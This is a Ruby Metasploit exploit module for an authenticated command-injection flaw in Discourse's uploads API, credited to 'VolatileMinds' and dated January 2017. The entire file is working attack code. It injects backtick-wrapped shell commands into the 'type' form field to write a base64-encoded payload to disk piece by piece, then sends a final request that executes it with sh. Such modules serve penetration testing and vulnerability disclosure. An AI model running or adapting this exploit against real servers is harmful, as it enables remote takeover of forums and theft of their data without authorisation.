##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Discourse API Upload Remote Command Execution',
      'Description' => %q{
    This module exploits an authenticated remote command execution vulnerability
    in Discourse.

    The Discourse API suffered from a command injection vulnerability for an
    authenticated user. Requires a valid username and API key.
      },
      'Author' =>
        [
          'VolatileMinds'
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
          ['URL', 'https://gist.github.com/joernchen/f28ec01de20b22bbbee1622a41deb601'],
          ['URL', 'https://github.com/discourse/discourse/commit/15b5fddd49e8fc5a783fa3a4e7f3c7f648e5ca8b']
        ],
      'Privileged' => false,
      'Platform'   =>  ['unix', 'linux'],
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 8 2017'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Discourse directory path", '/']),
        OptString.new('USERNAME', [true, "The username to auth with the API", "user"]),
        OptString.new('APIKEY', [true, "The API key to use with the API", ""]),
        OptString.new('IMAGEURL', [true, "The image URL to use when downsizing", "http://i.imgur.com/IubQm8k.jpg"])
      ], self.class)
  end

  def exploit

    filename = Rex::Text.rand_text_alpha(8)
    payload.encoded.split('').each_slice(20) do |slice|
      slice = slice.join
      type = Rex::Text.rand_text_alpha(5) + "`echo #{Rex::Text.encode_base64(slice)}|base64 --decode>>#{filename}``" + Rex::Text.rand_text_alpha(5)
      send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'uploads'),
        'vars_get' => {
          'api_key' => datastore['APIKEY'],
          'api_username' => datastore['USERNAME']
        },
        'vars_post' => {
          'username' => datastore['USERNAME'],
          'type' => type,
          'url' => datastore['IMAGEURL'],
          'synchronous' => true
        }
      })
    end

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'uploads'),
      'vars_get' => {
        'api_key' => datastore['APIKEY'],
        'api_username' => datastore['USERNAME']
      },
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'type' => Rex::Text.rand_text_alpha(5)+"`sh #{filename}`"+Rex::Text.rand_text_alpha(5),
        'url' => datastore['IMAGEURL'],
        'synchronous' => true
      }
    })
  end
end
